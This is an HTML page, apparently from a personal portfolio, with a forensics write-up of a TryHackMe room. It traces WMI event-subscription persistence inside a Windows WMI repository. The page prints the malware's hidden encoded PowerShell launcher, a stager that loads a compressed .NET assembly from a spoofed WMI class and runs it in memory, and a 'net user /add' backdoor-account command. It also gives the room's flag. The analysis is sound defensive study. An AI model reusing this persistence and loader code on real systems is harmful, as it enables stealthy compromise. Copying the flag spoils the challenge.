@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>After Hours // writeup</title>
+    <meta name="description" content="A WMI repository pulled from a compromised Windows host. Digging through OBJECTS.DATA to surface a hidden event subscription, decode the staged PowerShell and recover the flag from an embedded .NET assembly.">
+    <meta name="theme-color" content="#0a0506">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="../style.css">
+    <script>
+        (function () {
+            try {
+                if (localStorage.getItem('theme') === 'light') {
+                    document.documentElement.setAttribute('data-theme', 'light');
+                }
+            } catch (e) { }
+        })();
+    </script>
+</head>
+
+<body class="writeup-page">
+    <div class="scanlines" aria-hidden="true"></div>
+    <div class="scroll-progress" id="scrollProgress"></div>
+
+    <header class="writeup-topbar">
+        <a class="prompt-link" href="../writeups.html">
+            <span class="prompt-user">sameekey@portfolio</span><span class="prompt-sep">:</span><span class="prompt-path">~/writeups</span><span class="prompt-sym">$</span>
+            <span class="prompt-cmd">cd .. [Archive Portal]</span>
+        </a>
+        <div class="topbar-actions">
+            <a class="card-link small github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs" target="_blank" rel="noopener"><i class="fab fa-github"></i> GitHub Repo</a>
+            <a class="card-link small" href="../index.html" style="margin-right: 0.5rem;"><i class="fas fa-terminal"></i> Main Dossier</a>
+            <span class="kbd-hint"><kbd>T</kbd> theme</span>
+            <button class="theme-toggle" id="themeToggle" type="button">
+                <i class="fas fa-moon"></i><span>Theme</span>
+            </button>
+        </div>
+    </header>
+
+    <main class="writeup-shell">
+        <article class="writeup-article">
+            <div class="writeup-head">
+                <p class="writeup-kicker">// verified laboratory walkthrough</p>
+                <h1>After Hours</h1>
+                <div class="writeup-meta">
+                    <span class="badge">TryHackMe</span>
+      <span class="badge ghost">Forensics / Windows</span>
+      <span class="badge diff-medium">Medium</span>
+      <span class="meta-item"><i class="fas fa-calendar"></i> 2026-08-08</span>
+      <span class="meta-item"><i class="fas fa-tags"></i> TryHackMe / Forensics / Windows / WMI / Medium</span>
+      <span class="meta-item"><i class="fas fa-file-code"></i> after-hours-writeup.md</span>
+                </div>
+                <p class="writeup-summary">A WMI repository pulled from a compromised Windows host. Digging through OBJECTS.DATA to surface a hidden event subscription, decode the staged PowerShell and recover the flag from an embedded .NET assembly.</p>
+                <div class="writeup-actions">
+                    <a class="card-link github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs/blob/main/after-hours-writeup.pdf" target="_blank" rel="noopener"><i class="fab fa-github"></i> Open on GitHub</a>
+                    <a class="card-link" href="after-hours-writeup.pdf" download><i class="fas fa-file-pdf"></i> Download Verified PDF</a>
+                    <a class="card-link primary" href="../writeups.html"><i class="fas fa-scroll"></i> Writeups Portal</a>
+                    <a class="card-link" href="../index.html#writeups"><i class="fas fa-arrow-left"></i> Main Dossier</a>
+                </div>
+            </div>
+            <div class="writeup-body">
+                <h2>FORENSICS INVESTIGATION WRITEUP</h2>
+<h1>The Byte Lotus Hotel · After Hours</h1>
+<h2>Hacker Holidays 2026 · Windows Persistence · Reverse Engineering</h2>
+<p>Hacker Holidays 2026 &amp;#183; The Byte Lotus Hotel &amp;#183; After Hours Room Forensics / Medium (90 points) Category / Difficulty attachment.zip &amp;#8594; WMI repository: OBJECTS.DATA, INDEX.BTR, MAPPING1-3.MAP Evidence Something logs in after hours and survives reboot, hiding outside Startup / Scheduled Tasks / Scenario Parse system artifacts &amp;#8594; find hidden config &amp;#8594; locate malicious class &amp;#8594; de Objective THM{P4tch_op3ned_th3_BacKd00r} Flag Sameekey Author 8 August 2026 Date This report documents the full investigation chain end-to-end: identifying the artifact, discovering the WMI event subscription, decoding the staged PowerShell, extracting the payload from a custom WMI class, and recovering the flag from the embedded .NET assembly. All commands are shown without output so the analysis can be replayed. Page 1</p>
+<h1>1. Identifying the Artifact &amp; Context</h1>
+<p>The zip attachment.zip (on disk as attachments-1784136288483.zip) contains five files:</p>
+<pre class="code-block" data-lang="bash"><code>unzip -l attachment.zip
+  INDEX.BTR       5,070,848 B
+  MAPPING1.MAP       79,528 B
+  MAPPING2.MAP       79,528 B
+  MAPPING3.MAP       79,528 B
+  OBJECTS.DATA   24,199,168 B</code></pre>
+<p>These five names are the signature file set of the WMI repository (“CIM” database) at</p>
+<pre class="code-block" data-lang="bash"><code>C:\Windows\System32\wbem\Repository\. The room’s hint that the persistence is “in a corner</code></pre>
+<p>of the system most tools don’t think to check” is the giveaway: standard autoruns scanners (Startup, Run keys, Scheduled Tasks) do not enumerate WMI event subscriptions. Those subscriptions live inside OBJECTS.DATA. Key insight: INDEX.BTR / MAPPING1-3.MAP / OBJECTS.DATA == WMI repository, not a random database. Page 2</p>
+<h1>2. Finding the Malicious Event Subscription</h1>
+<p>The repository is a proprietary binary format, so the fastest first pass is keyword-matching the raw file (Mandiant’s PyWMIPersistenceFinder does exactly this). The attacker-created objects stand out from the OS’s default classes by their suspicious, legitimate-sounding names.</p>
+<pre class="code-block" data-lang="bash"><code>python3 PyWMIPersistenceFinder.py OBJECTS.DATA
+# or simply:
+grep -a -o -E &quot;EngineTelemetry\\w+&quot; OBJECTS.DATA | sort | uniq -c</code></pre>
+<p>Two attacker objects appear (each repeated because the repository snapshots instances):</p>
+<pre class="code-block" data-lang="bash"><code>•__EventFilter named EngineTelemetryFilter:
+SELECT * FROM __InstanceModificationEvent WITHIN 60
+WHERE TargetInstance ISA &#39;Win32_LocalTime&#39;
+  AND TargetInstance.Minute = 30
+# fires every hour at :30 -- &quot;after hours&quot; behaviour
+•__EventConsumer (CommandLineEventConsumer) named EngineTelemetryConsumer:
+cmd /C powershell.exe -Sta -Nop -Window Hidden -enc &lt;BASE64&gt;
+•A __FilterToConsumerBinding wires the two together: at minute 30 of every hour, WMI runs</code></pre>
+<p>the hidden PowerShell. This is textbook WMI event-subscription persistence — invisible to Autoruns and undetectable by inspecting Run keys, because the “program” exists only as WMI class instances in the repository. Page 3</p>
+<h1>3. Stage 1 — Decoding the PowerShell</h1>
+<pre class="code-block" data-lang="bash"><code>The -enc payload is base64 of a UTF-16LE PowerShell script. Decode and print it:
+python3 - &lt;&lt;&#39;EOF&#39;
+import base64
+print(base64.b64decode(B64).decode(&#39;utf-16-le&#39;))
+EOF</code></pre>
+<p>Result — a stager that fetches the real payload from another WMI class:</p>
+<pre class="code-block" data-lang="bash"><code>$file = ([WmiClass]&#39;ROOT\cimv2:Win32_HardwareTelemetry&#39;)
+            .Properties[&#39;ConfigData&#39;].Value;
+$o = New-Object IO.MemoryStream;
+$d = New-Object IO.Compression.DeflateStream(
+        [IO.MemoryStream][Convert]::FromBase64String($file),
+        [IO.Compression.CompressionMode]::Decompress);
+$b = New-Object Byte[](1024);
+$r = $d.Read($b,0,1024);
+while($r -gt 0){ $o.Write($b,0,$r); $r = $d.Read($b,0,1024); }
+[Reflection.Assembly]::Load($o.ToArray())
+   .EntryPoint.Invoke($null,@(,[string[]]@())) | Out-Null
+So the true payload is stashed in a custom WMI class named Win32_HardwareTelemetry (a
+spoofed class that sounds like OS telemetry). Its ConfigData property holds a base64 string of</code></pre>
+<p>deflate-compressed data. Page 4</p>
+<h1>4. Extracting &amp; Decompressing the Payload</h1>
+<pre class="code-block" data-lang="bash"><code>python3 - &lt;&lt;&#39;EOF&#39;
+import re, base64, zlib
+data = open(&#39;OBJECTS.DATA&#39;,&#39;rb&#39;).read()
+m = re.search(rb&#39;Win32_HardwareTelemetry\x00\x00ConfigData&#39;, data)
+i = data.find(b&#39;string\x00\x00&#39;, m.start())
+b64 = re.match(rb&#39;[A-Za-z0-9+/=]+&#39;, data[i+len(b&#39;string\x00\x00&#39;):]).group()
+raw = base64.b64decode(b64)                     # -&gt; deflate stream
+pe  = zlib.decompress(raw, -15)                 # raw-DEFLATE
+open(&#39;payload.bin&#39;,&#39;wb&#39;).write(pe)              # -&gt; 4096-byte .NET PE
+EOF
+The decompressed bytes begin with MZ — a 4096-byte .NET assembly. Its metadata strings name
+the project updates.exe with a class AfterHours, confirming the room’s name.</code></pre>
+<h1>5. Recovering the Flag</h1>
+<p>The flag is not stored as a literal string. Extracting all UTF-16LE strings from the assembly shows the program logic:</p>
+<pre class="code-block" data-lang="bash"><code>python3 - &lt;&lt;&#39;EOF&#39;
+import re
+s = open(&#39;payload.bin&#39;,&#39;rb&#39;).read().decode(&#39;utf-16-le&#39;,&#39;ignore&#39;)
+for m in re.finditer(r&#39;[ -~\x7f]{5,}&#39;, s): print(repr(m.group()))
+EOF
+bytelotusdc
+cmd.exe
+/c net user patch VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9 /add
+Execution halted: Environment mismatch.
+updates.exe</code></pre>
+<p>The assembly performs two steps:</p>
+<pre class="code-block" data-lang="bash"><code>•Environment check: compares Environment.MachineName against bytelotusdc; on</code></pre>
+<p>mismatch it prints “Execution halted: Environment mismatch.” and exits. The implant only runs on the victim named “bytelotusdc”.</p>
+<pre class="code-block" data-lang="bash"><code>•Persistence via account creation: runs cmd.exe /c net user patch &lt;PASSWORD&gt; /add</code></pre>
+<ul><li>silently adding a local backdoor user called “patch”.</li></ul>
+<p>The password is itself base64. Decoding it yields the flag:</p>
+<pre class="code-block" data-lang="bash"><code>python3 -c &quot;import base64; print(base64.b64decode(
+  &#39;VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9&#39;).decode())&quot;
+# THM{P4tch_op3ned_th3_BacKd00r}</code></pre>
+<h2>Flag:THM{P4tch_op3ned_th3_BacKd00r}</h2>
+<h1>6. Full Kill-Chain Summary</h1>
+<p>Step What was done Result 1 Identify the 5 attachment files WMI repository (OBJECTS.DATA etc.) 2 Keyword-scan OBJECTS.DATA EngineTelemetryFilter + EngineTelemetryConsumer 3 Decode the -enc PowerShell (UTF-16 base64) Stager reading Win32_HardwareTelemetry.ConfigData 4 Extract ConfigData, base64-decode, DEFLATE-decompress 4096-byte .NET assembly updates.exe 5 Dump UTF-16 strings of the assembly net user patch &lt;b64-password&gt; /add 6 Base64-decode the password THM{P4tch_op3ned_th3_BacKd00r}</p>
+<h1>7. Key Takeaways</h1>
+<p>•Know the artifact: OBJECTS.DATA / INDEX.BTR / MAPPING*.MAP are the WMI repository — a persistence hiding place invisible to Startup / Run-key / Scheduled-Task scanners. •WMI persistence triage: look for <strong>EventFilter + </strong>EventConsumer (CommandLine/ActiveScript) + __FilterToConsumerBinding triplets; benign-sounding names like “EngineTelemetry” are a red flag. •Layered stagers: the first -enc blob was only a loader; the real payload lived in a custom WMI class (Win32_HardwareTelemetry.ConfigData), base64 + raw DEFLATE-wrapped .NET PE. •.NET payloads: dump UTF-16 strings first — constants and backdoor commands (net user /add) sit in the #Strings heap in plain UTF-16LE. •Obfuscation in plain sight: the “password” was itself base64; always run b64decode on suspicious tokens found in code/commands. © 2026 Sameekey — TryHackMe “Hacker Holidays 2026 – After Hours” writeup. Page 7</p>
+            </div>
+            <div class="writeup-foot">
+                <a class="card-link primary" href="../writeups.html"><i class="fas fa-scroll"></i> Full Writeups Portal</a>
+                <a class="card-link" href="../index.html#writeups"><i class="fas fa-arrow-left"></i> Main Dossier</a>
+                <a class="card-link github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs/blob/main/after-hours-writeup.pdf" target="_blank" rel="noopener"><i class="fab fa-github"></i> Open on GitHub</a>
+                <a class="card-link" href="after-hours-writeup.pdf" download><i class="fas fa-file-pdf"></i> Download Verified PDF</a>
+                <a class="card-link" href="mailto:parajulisameek@gmail.com"><i class="fas fa-envelope"></i> report a typo</a>
+            </div>
+        </article>
+    </main>
+
+    <footer class="site-footer">
+        <p class="footer-cmd">
+            <span class="prompt-user">sameekey@portfolio</span><span class="prompt-sep">:</span><span class="prompt-path">~</span><span class="prompt-sym">$</span>
+            echo "Defense is good. Offense is mandatory."
+        </p>
+        <p class="footer-muted">&copy; <span id="year"></span> Sameek Parajuli &middot; <a href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs" target="_blank" rel="noopener">GitHub /tryhackme_walkthroughs</a></p>
+    </footer>
+
+    <!-- Image Lightbox Modal -->
+    <div class="lightbox-modal" id="lightboxModal" hidden>
+        <div class="lightbox-backdrop"></div>
+        <div class="lightbox-content">
+            <img src="" id="lightboxImg" alt="Enlarged view">
+            <button class="lightbox-close" id="lightboxClose" type="button">&times;</button>
+        </div>
+    </div>
+
+    <div class="scroll-to-top" id="scrollToTop" role="button" tabindex="0" aria-label="Scroll to top">
+        <i class="fas fa-arrow-up"></i>
+    </div>
+
+    <script src="../script.js"></script>
+</body>
+
+</html>
